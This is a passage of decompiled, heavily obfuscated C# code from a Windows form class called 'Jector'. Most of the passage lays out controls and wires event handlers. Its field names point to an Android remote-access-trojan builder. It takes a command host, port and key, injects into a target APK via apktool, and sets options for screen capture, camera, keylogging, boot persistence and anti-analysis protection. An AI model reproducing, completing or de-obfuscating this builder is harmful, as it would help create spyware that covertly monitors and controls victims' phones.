            this.TabPage1.Controls.Add((Control) this.PictureBox1);
            num1 = (int) num3 * 1732071894 ^ 985362135;
            continue;
          case 362:
            this.Label5.Location = new Point(20, 26);
            this.Label5.Name = EXGuarder.\u00305243431;
            this.Label5.Size = new Size(170, 27);
            num1 = (int) num3 * -325144420 ^ -1822631343;
            continue;
          case 363:
            this.autopanel.Name = EXGuarder.\u00311524165;
            this.autopanel.Size = new Size(817, 629);
            this.autopanel.TabIndex = 24;
            num1 = (int) num3 * 1051763989 ^ 1057863621;
            continue;
          case 364:
            this.Panel1.Location = new Point(30, 199);
            this.Panel1.Name = EXGuarder.\u0035F670B38;
            num1 = (int) num3 * 75055745 ^ -1317308766;
            continue;
          case 365:
            this.Button3.Size = new Size(691, 61);
            num1 = (int) num3 * 1048900009 ^ -1797381972;
            continue;
          case 366:
            this.list_activ.TabIndex = 1;
            this.list_activ.Text = EXGuarder.\u0035B6B3E33;
            num1 = (int) num3 * 880499912 ^ 1399687457;
            continue;
          case 367:
            this.Font = new Font(EXGuarder.\u0032F541671, 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * 779282376 ^ 1519825531;
            continue;
          case 368:
            this.Label5 = new Label();
            this.log = new TextBox();
            this.Button3 = new Button();
            num1 = (int) num3 * -573634414 ^ -836025786;
            continue;
          case 369:
            this.TabPage4.BackColor = Color.Black;
            num1 = (int) num3 * -1965806570 ^ -1653575117;
            continue;
          case 370:
            this.Label2.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label2.Location = new Point(405, 215);
            this.Label2.Name = EXGuarder.\u0031E600837;
            num1 = (int) num3 * 1860995180 ^ -1195371285;
            continue;
          case 371:
            this.Host.TabIndex = 22;
            num1 = (int) num3 * -1867391119 ^ 1010356209;
            continue;
          case 372:
            this.TargetApktext.Location = new Point(198, 66);
            num1 = (int) num3 * 190704679 ^ -1346062804;
            continue;
          case 373:
            this.CLiname.Padding = new Padding(5);
            this.CLiname.Radius = 15;
            num1 = (int) num3 * 1108271574 ^ -910375855;
            continue;
          case 374:
            this.FolderPath.ReadOnly = true;
            num1 = (int) num3 * -377381612 ^ 1003661734;
            continue;
          case 375:
            this.Label12.Name = EXGuarder.\u003233E1E3F;
            this.Label12.Size = new Size(216, 29);
            num1 = (int) num3 * 2032551161 ^ 541621193;
            continue;
          case 376:
            goto label_3;
          case 377:
            this.PictureBox1 = new PictureBox();
            num1 = (int) num3 * 848676971 ^ -562210082;
            continue;
          case 378:
            this.CLiname.TextAlignment = ContentAlignment.TopCenter;
            this.paneltargetfolder.BorderStyle = BorderStyle.FixedSingle;
            this.paneltargetfolder.Controls.Add((Control) this.Label4);
            this.paneltargetfolder.Controls.Add((Control) this.FolderPath);
            this.paneltargetfolder.Controls.Add((Control) this.Button1);
            this.paneltargetfolder.Location = new Point(61, 234);
            num1 = (int) num3 * 384611674 ^ -360705569;
            continue;
          case 379:
            this.DrakeUITitlePanel2.Location = new Point(0, 629);
            this.DrakeUITitlePanel2.Margin = new Padding(4, 5, 4, 5);
            this.DrakeUITitlePanel2.Name = EXGuarder.\u0036B11681D;
            this.DrakeUITitlePanel2.Padding = new Padding(0, 35, 0, 0);
            this.DrakeUITitlePanel2.Radius = 15;
            num1 = (int) num3 * 804329934 ^ -357347768;
            continue;
          case 380:
            this.DrakeUITitlePanel2.Size = new Size(817, 34);
            num1 = (int) num3 * 1194206828 ^ -1233533057;
            continue;
          case 381:
            this.titletext.Size = new Size(254, 32);
            this.titletext.Style = UIStyle.Custom;
            num1 = (int) num3 * -324777226 ^ 1422978918;
            continue;
          case 382:
            this.checksuper = new CheckBox();
            this.Label7 = new Label();
            this.Panel1 = new Panel();
            this.Host = new DrakeUITextBox();
            num1 = (int) num3 * -2015847122 ^ -1171879482;
            continue;
          case 383:
            this.checkkeepscreen = new CheckBox();
            this.Panel1.SuspendLayout();
            num1 = (int) num3 * -1870114830 ^ -1733691111;
            continue;
          case 384:
            this.DrakeUIAvatar5.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 471023488 ^ -1392577803;
            continue;
          case 385:
            this.Label2.Font = new Font(EXGuarder.\u0035E136B3A, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * -1944798737 ^ 1643300988;
            continue;
          case 386:
            this.list_activ.Location = new Point(126, 0);
            this.list_activ.Name = EXGuarder.\u00359030A6E;
            num1 = (int) num3 * 766476262 ^ -2005677895;
            continue;
          case 387:
            this.DrakeUIAvatar5.Size = new Size(36, 28);
            num1 = (int) num3 * -1892540763 ^ -2079939577;
            continue;
          case 388:
            this.TabPage3.Controls.Add((Control) this.checksuper);
            num1 = (int) num3 * 255499246 ^ 433186028;
            continue;
          case 389:
            this.mnulpanel = new Panel();
            this.autopanel = new Panel();
            num1 = (int) num3 * -504025391 ^ -341539895;
            continue;
          case 390:
            this.Label4.AutoSize = true;
            this.Label4.Font = new Font(EXGuarder.\u0032F541671, 13f);
            num1 = (int) num3 * 1922743999 ^ 257711816;
            continue;
          case 391:
            this.TheKey.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 486716913 ^ 649945974;
            continue;
          case 392:
            this.Button3.UseVisualStyleBackColor = false;
            num1 = (int) num3 * 1189156262 ^ 1064729257;
            continue;
          case 393:
            this.checksuper.UseVisualStyleBackColor = true;
            num1 = (int) num3 * 310388087 ^ 1069122970;
            continue;
          case 394:
            this.ComboPrims.TabIndex = 37;
            num1 = (int) num3 * 1694333716 ^ 1960248044;
            continue;
          case 395:
            this.TabPage3.Location = new Point(126, 0);
            this.TabPage3.Name = EXGuarder.\u0036958206C;
            num1 = (int) num3 * -1704694791 ^ -1299285145;
            continue;
          case 396:
            this.Panel5.Name = EXGuarder.\u0037025480F;
            this.Panel5.Size = new Size(817, 629);
            this.Panel5.TabIndex = 25;
            num1 = (int) num3 * 1789734275 ^ -198556913;
            continue;
          case 397:
            this.maintapcontrols.TabSelectedForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1080148538 ^ -377567368;
            continue;
          case 398:
            this.maintapcontrols.SizeMode = TabSizeMode.Fixed;
            num1 = (int) num3 * 840231108 ^ -293413431;
            continue;
          case 399:
            this.DrakeUIAvatar5.Style = UIStyle.Custom;
            this.DrakeUIAvatar5.Symbol = 61529;
            this.DrakeUIAvatar5.SymbolSize = 25;
            num1 = (int) num3 * -935080934 ^ 1906929589;
            continue;
          case 400:
            this.maintapcontrols = new DrakeUITabControlMenu();
            this.TabPage1 = new TabPage();
            num1 = (int) num3 * 770816989 ^ 1372697046;
            continue;
          case 401:
            this.mnulpanel.SuspendLayout();
            this.Panel5.SuspendLayout();
            this.SuspendLayout();
            this.Label1.AutoSize = true;
            this.Label1.Font = new Font(EXGuarder.\u0035E136B3A, 14f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            this.Label1.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label1.Location = new Point(82, 215);
            this.Label1.Name = EXGuarder.\u0030D5B554D;
            this.Label1.Size = new Size(108, 29);
            num1 = (int) num3 * -110284485 ^ -1153162791;
            continue;
          case 402:
            this.Button3.Font = new Font(EXGuarder.\u0032F541671, 15f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
            num1 = (int) num3 * -1301315345 ^ -1924531114;
            continue;
          case 403:
            this.Label12.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label12.Location = new Point(52, 153);
            num1 = (int) num3 * 976799206 ^ -1219827910;
            continue;
          case 404:
            this.checkonlymain = new DrakeUICheckBox();
            num1 = (int) num3 * -359876318 ^ -448939489;
            continue;
          default:
            goto label_407;
        }
      }
label_3:
      return;
label_407:;
    }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label2")]
    internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label3")]
    internal virtual Label Label3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("FolderPath")]
    internal virtual TextBox FolderPath { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        Button button1 = this._Button1;
label_1:
        int num1 = -1322847269;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((num1 - ~--1615044343 ^ ~~(--1365468265 ^ -1832727317)) - (359574920 + 582486035 - 132175797 + ~126283245 * 1861270491) ^ 1782337736) * 85544621 * -1132802869)) % 7U)
          {
            case 0:
              int num3 = button1 == null ? 582646016 : (num3 = -1082352024);
              num1 = num3 ^ (int) num2 * 1873823306;
              continue;
            case 1:
              goto label_3;
            case 2:
              button1.Click -= eventHandler;
              num1 = (int) num2 * -739211299 ^ -729563820;
              continue;
            case 3:
              goto label_1;
            case 4:
              button1.Click += eventHandler;
              num1 = (int) num2 * -85818752 ^ -1371757478;
              continue;
            case 5:
              this._Button1 = value;
              button1 = this._Button1;
              num1 = 416224385;
              continue;
            case 6:
              int num4 = button1 == null ? -11102828 : (num4 = -21009988);
              num1 = num4 ^ (int) num2 * -1304443031;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Button addactiv
    {
      get => this._addactiv;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.addactiv_click);
        Button addactiv = this._addactiv;
        if (addactiv == null)
          goto label_6;
label_1:
        int num1 = -699791938;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) --(~(~num1 * -957361499) ^ ~(1169562144 - 1111471744))) % 6U)
          {
            case 0:
              addactiv.Click += eventHandler;
              num1 = (int) num2 * -94912149 ^ -839508676;
              continue;
            case 1:
              goto label_3;
            case 2:
              goto label_1;
            case 3:
              int num3 = addactiv == null ? 1972336440 : (num3 = -581080649);
              num1 = num3 ^ (int) num2 * -474076010;
              continue;
            case 4:
              goto label_6;
            case 5:
              addactiv.Click -= eventHandler;
              num1 = (int) num2 * -1292704204 ^ -856902453;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_6:
        this._addactiv = value;
        addactiv = this._addactiv;
        num1 = -1733617834;
        goto label_2;
      }
    }

    [field: AccessedThroughProperty("Label5")]
    internal virtual Label Label5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("log")]
    internal virtual TextBox log { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button Button3
    {
      get => this._Button3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button3_Click);
label_1:
        int num1 = 915505455;
        Button button3;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) --((~num1 - (~(-737025427 ^ 1579887086 ^ -2100778595 - 1740302543) + ~(315679130 ^ 1067469789 ^ 471502348 - 1572227126)) - (-693897570 * 1063555125 + 23704943)) * -115937625)) % 7U)
          {
            case 0:
              button3.Click += eventHandler;
              num1 = (int) num2 * 435579816 ^ -2017896354;
              continue;
            case 1:
              goto label_3;
            case 2:
              button3 = this._Button3;
              num1 = (int) num2 * 407410683 ^ -1569127699;
              continue;
            case 3:
              this._Button3 = value;
              button3 = this._Button3;
              int num3;
              num1 = num3 = button3 == null ? -1107516002 : (num3 = 2030748754);
              continue;
            case 4:
              int num4 = button3 == null ? 1462988784 : (num4 = 912035736);
              num1 = num4 ^ (int) num2 * -84569850;
              continue;
            case 5:
              goto label_1;
            case 6:
              button3.Click -= eventHandler;
              num1 = (int) num2 * -1574339915 ^ 888819286;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    [field: AccessedThroughProperty("Label4")]
    internal virtual Label Label4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("checksuper")]
    internal virtual CheckBox checksuper { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label7")]
    internal virtual Label Label7 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Panel1")]
    internal virtual Panel Panel1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("paneltargetfolder")]
    internal virtual Panel paneltargetfolder { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("ToolTip1")]
    internal virtual ToolTip ToolTip1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("PictureBox1")]
    internal virtual PictureBox PictureBox1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("checkkill")]
    internal virtual CheckBox checkkill { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Host")]
    internal virtual DrakeUITextBox Host { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TheKey")]
    internal virtual DrakeUITextBox TheKey { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Port")]
    internal virtual DrakeUITextBox Port { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("CLiname")]
    internal virtual DrakeUITextBox CLiname { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("maintapcontrols")]
    internal virtual DrakeUITabControlMenu maintapcontrols { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TabPage1")]
    internal virtual TabPage TabPage1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("list_activ")]
    internal virtual TabPage list_activ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TabPage3")]
    internal virtual TabPage TabPage3 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TabPage4")]
    internal virtual TabPage TabPage4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Activlist")]
    internal virtual DrakeUIListBox Activlist { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("DrakeUIAvatar4")]
    internal virtual DrakeUIAvatar DrakeUIAvatar4 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual DrakeUITitlePanel DrakeUITitlePanel2
    {
      get => this._DrakeUITitlePanel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUITitlePanel2_Click);
        DrakeUITitlePanel drakeUiTitlePanel2 = this._DrakeUITitlePanel2;
label_1:
        int num1 = 939479136;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-(--1232806455 + -1206953279 * 1668033897 - -107481195 - -434268135 - (num2 - (1565856655 * (-656775946 ^ -1208826098 ^ -1018035824) - ~(1962873553 * -(227937215 - 726344950)))) ^ ~(~207068444 ^ --89458078)) * -258110941 ^ -1166387821)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              int num4 = drakeUiTitlePanel2 == null ? -1582479648 : (num4 = 327622177);
              num1 = num4 ^ (int) num3 * -1879185178;
              continue;
            case 2:
              this._DrakeUITitlePanel2 = value;
              num1 = 1551736758;
              continue;
            case 3:
              drakeUiTitlePanel2.Click += eventHandler;
              num1 = (int) num3 * 731594153 ^ 658090057;
              continue;
            case 4:
              drakeUiTitlePanel2 = this._DrakeUITitlePanel2;
              int num5 = drakeUiTitlePanel2 == null ? 1165141671 : (num5 = 1280202143);
              num1 = num5 ^ (int) num3 * 1346483680;
              continue;
            case 5:
              goto label_1;
            case 6:
              drakeUiTitlePanel2.Click -= eventHandler;
              num1 = (int) num3 * -802706775 ^ 1774952056;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    [field: AccessedThroughProperty("Label12")]
    internal virtual Label Label12 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("DrakeUIAvatar5")]
    internal virtual DrakeUIAvatar DrakeUIAvatar5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label14")]
    internal virtual Label Label14 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("ComboPrims")]
    internal virtual ComboBox ComboPrims { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button removeactiv
    {
      get => this._removeactiv;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Removeactiv_Click);
label_1:
        int num1 = -1628475257;
        Button removeactiv;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~((-num1 - (~(-86832498 - -143185663 + 1890760970) ^ ~(--1570018887 - --412059737))) * -333392069) + 2067467943 * -741758464)) % 8U)
          {
            case 0:
              removeactiv = this._removeactiv;
              num1 = (int) num2 * 682330416 ^ 1044771776;
              continue;
            case 1:
              removeactiv.Click += eventHandler;
              num1 = (int) num2 * 589066755 ^ 1937997047;
              continue;
            case 2:
              int num3 = removeactiv == null ? 1062032632 : (num3 = -1144966351);
              num1 = num3 ^ (int) num2 * 945330770;
              continue;
            case 3:
              this._removeactiv = value;
              num1 = -1409610526;
              continue;
            case 4:
              removeactiv.Click -= eventHandler;
              num1 = (int) num2 * -1524037596 ^ -1185108597;
              continue;
            case 5:
              goto label_1;
            case 6:
              goto label_3;
            case 7:
              removeactiv = this._removeactiv;
              int num4 = removeactiv == null ? 1089440623 : (num4 = 1423175730);
              num1 = num4 ^ (int) num2 * -111322740;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    [field: AccessedThroughProperty("checkDraw")]
    internal virtual CheckBox checkDraw { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("DrakeUIAvatar6")]
    internal virtual DrakeUIAvatar DrakeUIAvatar6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("checkautoclick")]
    internal virtual CheckBox checkautoclick { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("mnulpanel")]
    internal virtual Panel mnulpanel { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("autopanel")]
    internal virtual Panel autopanel { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Panel5")]
    internal virtual Panel Panel5 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual DrakeUICheckBox CheckAutomatic
    {
      get => this._CheckAutomatic;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        MouseEventHandler mouseEventHandler = new MouseEventHandler(this.CheckAutomatic_MouseClick);
        DrakeUICheckBox checkAutomatic = this._CheckAutomatic;
label_1:
        int num1 = -531035436;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) --((-num1 ^ ~(-1234448441 * -1194133823) - ((-1607741516 ^ 1866583285) + -743067756 * -829029341) - (788919571 * 1308358531 - 480337232 ^ 1476019427 - 551054242 ^ ~222551905)) * -587758071 ^ --1210040216)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              checkAutomatic.MouseClick += mouseEventHandler;
              num1 = (int) num2 * -1525456223 ^ 673939311;
              continue;
            case 2:
              this._CheckAutomatic = value;
              checkAutomatic = this._CheckAutomatic;
              num1 = -1451836710;
              continue;
            case 3:
              int num3 = checkAutomatic == null ? -1544212591 : (num3 = 1190310429);
              num1 = num3 ^ (int) num2 * 1053807754;
              continue;
            case 4:
              int num4 = checkAutomatic == null ? 2044972458 : (num4 = 790219047);
              num1 = num4 ^ (int) num2 * -1989452552;
              continue;
            case 5:
              checkAutomatic.MouseClick -= mouseEventHandler;
              num1 = (int) num2 * -938650857 ^ -644544682;
              continue;
            case 6:
              goto label_1;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    [field: AccessedThroughProperty("labeltargetapp")]
    internal virtual Label labeltargetapp { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TargetApktext")]
    internal virtual TextBox TargetApktext { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button selectapkbtn
    {
      get => this._selectapkbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Selectapkbtn_Click);
label_1:
        int num1 = -922002196;
        Button selectapkbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~~(-num1 - (~((1373941799 ^ -988664) - 1236553776) - -(1845365855 + 370321928) * 112214081) - (-584068079 * -594726161 ^ -1725327773 - -445521449 ^ -(1237979012 * 1744920557))) - 244374949)) % 9U)
          {
            case 0:
              selectapkbtn = this._selectapkbtn;
              num1 = (int) num2 * 1031830444 ^ 138378636;
              continue;
            case 1:
              int num3 = selectapkbtn == null ? -14092995 : (num3 = 55391199);
              num1 = num3 ^ (int) num2 * 1904670903;
              continue;
            case 2:
              selectapkbtn.Click += eventHandler;
              num1 = (int) num2 * -242452920 ^ -670856414;
              continue;
            case 3:
              selectapkbtn.Click -= eventHandler;
              num1 = (int) num2 * -1097685403 ^ 2018836502;
              continue;
            case 4:
              this._selectapkbtn = value;
              num1 = -1850632125;
              continue;
            case 5:
              goto label_1;
            case 6:
              goto label_3;
            case 7:
              selectapkbtn = this._selectapkbtn;
              num1 = (int) num2 * -754107445 ^ -1241021394;
              continue;
            case 8:
              int num4 = selectapkbtn == null ? -1811357004 : (num4 = 978162331);
              num1 = num4 ^ (int) num2 * 2129572112;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    [field: AccessedThroughProperty("panelactivitys")]
    internal virtual Panel panelactivitys { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("checkonlymain")]
    internal virtual DrakeUICheckBox checkonlymain { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("msgtext")]
    internal virtual DrakeUITextBox msgtext { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("titletext")]
    internal virtual DrakeUITextBox titletext { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("Label6")]
    internal virtual Label Label6 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("DrakeWidth_W1")]
    internal virtual DrakeWidth_W DrakeWidth_W1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("checkprotector")]
    internal virtual DrakeUICheckBox checkprotector { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("checkkeepscreen")]
    internal virtual CheckBox checkkeepscreen { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    public Jector()
    {
label_1:
      int num1 = -557136286;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (((-num1 + ~(~~-558297199 - --340239853) ^ (--820124769 ^ 661870164) * -1140270227 ^ ~-1335678042) - (-681201397 ^ 938897872)) * -1782904099)) % 42U)
        {
          case 0:
            ((PermissionsManager) this).originalapkname = EXGuarder.\u0033172704A;
            ((PermissionsManager) this).Apkeditorpath = EXGuarder.\u0033172704A;
            ((PermissionsManager) this).protectfinished = false;
            ((PermissionsManager) this).rshit = (Random) null;
            num1 = (int) num2 * 1225021371 ^ 1673319337;
            continue;
          case 1:
            ((nonetform) this).newsrvrun = EXGuarder.\u0033172704A;
            num1 = (int) num2 * -907222930 ^ 1877054808;
            continue;
          case 2:
            ((NotificationMaker) this).newcnm = EXGuarder.\u0033172704A;
            ((NotificationMaker) this).newsndmthd = EXGuarder.\u0033172704A;
            ((NotificationMaker) this).newforuce = EXGuarder.\u0033172704A;
            ((NotificationMaker) this).newplgs = EXGuarder.\u0033172704A;
            num1 = (int) num2 * 693492698 ^ 2102843941;
            continue;
          case 3:
            ((LanguageSelector) this).newgetbyts = EXGuarder.\u0033172704A;
            num1 = (int) num2 * -927493818 ^ -2043843233;
            continue;
          case 4:
            ((PermissionsManager) this).need_all = false;
            num1 = (int) num2 * -1331303630 ^ 675074887;
            continue;
          case 5:
            ((NotificationMaker) this).need_write = false;
            num1 = (int) num2 * -241740578 ^ 1465303816;
            continue;
          case 6:
            ((NotificationMaker) this).need_battery = false;
            num1 = (int) num2 * -1807839972 ^ -1625535893;
            continue;
          case 7:
            ((KeyboardManager) this).N_ClassGen = EXGuarder.\u003706D2032;
            num1 = (int) num2 * 367739420 ^ -785556687;
            continue;
          case 8:
            ((PermissionsManager) this).need_syswinow = false;
            ((PermissionsManager) this).need_boot = false;
            num1 = (int) num2 * 2120050069 ^ 767427058;
            continue;
          case 9:
            ((KeyboardManager) this).N__CamActivity_ = EXGuarder.\u0033172704A;
            num1 = (int) num2 * -1709408618 ^ -307691259;
            continue;
          case 10:
            ((NotificationMaker) this).newkey = EXGuarder.\u0033172704A;
            num1 = (int) num2 * -1020062875 ^ 485594537;
            continue;
          case 11:
            // ISSUE: reference to a compiler-generated field
            ((Jector._Closure\u0024__287\u002D1) this).N__srv_worker_ = EXGuarder.\u003220F4079;
            ((KeyboardManager) this).N_cap_sc_ = EXGuarder.\u003391B2574;
            num1 = (int) num2 * 278900609 ^ -1639529753;
            continue;
          case 12:
            // ISSUE: reference to a compiler-generated field
            ((Jector._Closure\u0024__287\u002D0) this).N_newEngineWorkerins = EXGuarder.\u0037554082D;
            num1 = (int) num2 * 1624269768 ^ -1167910067;
            continue;
          case 13:
            ((NotificationMaker) this).need_read = false;
            ((NotificationMaker) this).need_forground = false;
            num1 = (int) num2 * 991219017 ^ -1428960157;
            continue;
          case 14:
            this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
            this.Load += new EventHandler(this.Form1_Load);
            this.N__ask_prim_ = EXGuarder.\u003644E462D;
            num1 = (int) num2 * -627171784 ^ 1940967111;
            continue;
          case 15:
            ((KeyboardManager) this).N__ask_draw_ = EXGuarder.\u0033172704A;
            num1 = (int) num2 * 200009220 ^ -1320147641;
            continue;
          case 16:
            goto label_3;
          case 17:
            ((PermissionsManager) this).cou3 = 0;
            num1 = (int) num2 * 589618623 ^ 1912736935;
            continue;
          case 18:
            ((PermissionsManager) this).outputapk = EXGuarder.\u0033172704A;
            num1 = (int) num2 * 1448571104 ^ -384637914;
            continue;
          case 19:
            ((NotificationMaker) this).TK = EXGuarder.\u0035871281E;
            num1 = (int) num2 * -465871105 ^ 2081836610;
            continue;
          case 20:
            ((NotificationMaker) this).cou = 1;
            num1 = (int) num2 * -1986411374 ^ -1480284461;
            continue;
          case 21:
            ((PermissionsManager) this).ASKPRIM_all = false;
            ((PermissionsManager) this).Once = false;
            ((PermissionsManager) this).HoldMainThread = false;
            ((PermissionsManager) this).WorkingDir = EXGuarder.\u0033172704A;
            num1 = (int) num2 * 2092643332 ^ -845527477;
            continue;
          case 22:
            goto label_1;
          case 23:
            ((NotificationMaker) this).newalive = EXGuarder.\u0033172704A;
            ((NotificationMaker) this).newname = EXGuarder.\u0033172704A;
            num1 = (int) num2 * 653617849 ^ 1469784686;
            continue;
          case 24:
            ((PermissionsManager) this).ApkZIPpath = EXGuarder.\u0033172704A;
            num1 = (int) num2 * 1268856028 ^ 680914248;
            continue;
          case 25:
            ((NotificationMaker) this).newhost = EXGuarder.\u0033172704A;
            ((NotificationMaker) this).newport = EXGuarder.\u0033172704A;
            num1 = (int) num2 * -1397943356 ^ -1211237012;
            continue;
          case 26:
            ((KeyboardManager) this).N_update_app_ = EXGuarder.\u003171E1E0F;
            ((KeyboardManager) this).N_WackMeUpJob = EXGuarder.\u0034A4A1D5D;
            num1 = (int) num2 * -1939702036 ^ 748814539;
            continue;
          case 27:
            this.N__access_ask_ = EXGuarder.\u003504A0440;
            num1 = (int) num2 * -1968676176 ^ -785254802;
            continue;
          case 28:
            ((nonetform) this).split3 = EXGuarder.\u0033172704A;
            num1 = (int) num2 * 690736091 ^ 582307300;
            continue;
          case 29:
            ((NotificationMaker) this).neweco = EXGuarder.\u0033172704A;
            num1 = (int) num2 * 1712852988 ^ -1026025153;
            continue;
          case 30:
            ((NotificationMaker) this).newcnl = EXGuarder.\u0033172704A;
            num1 = (int) num2 * 1776475889 ^ 162917812;
            continue;
          case 31:
            ((PermissionsManager) this).FoundJava = false;
            ((PermissionsManager) this).apktemp = EXGuarder.\u0033172704A;
            ((PermissionsManager) this).apktoolpath = EXGuarder.\u0033172704A;
            num1 = (int) num2 * 437885626 ^ -1052462501;
            continue;
          case 32:
            ((LanguageSelector) this).N__webviewer_ = EXGuarder.\u0033172704A;
            num1 = (int) num2 * -1891651176 ^ 1754799102;
            continue;
          case 33:
            ((KeyboardManager) this).N__SCRActivity_ = EXGuarder.\u0033172704A;
            num1 = (int) num2 * 1852638818 ^ 34546104;
            continue;
          case 34:
            this.InitializeComponent();
            num1 = (int) num2 * 840099492 ^ -710480070;
            continue;
          case 35:
            ((KeyboardManager) this).N__ask_battary_ = EXGuarder.\u0033172704A;
            num1 = (int) num2 * 1844302908 ^ -1213257005;
            continue;
          case 36:
            ((nonetform) this).split1 = EXGuarder.\u0033172704A;
            ((nonetform) this).split2 = EXGuarder.\u0033172704A;
            num1 = (int) num2 * -1355458784 ^ 2141584352;
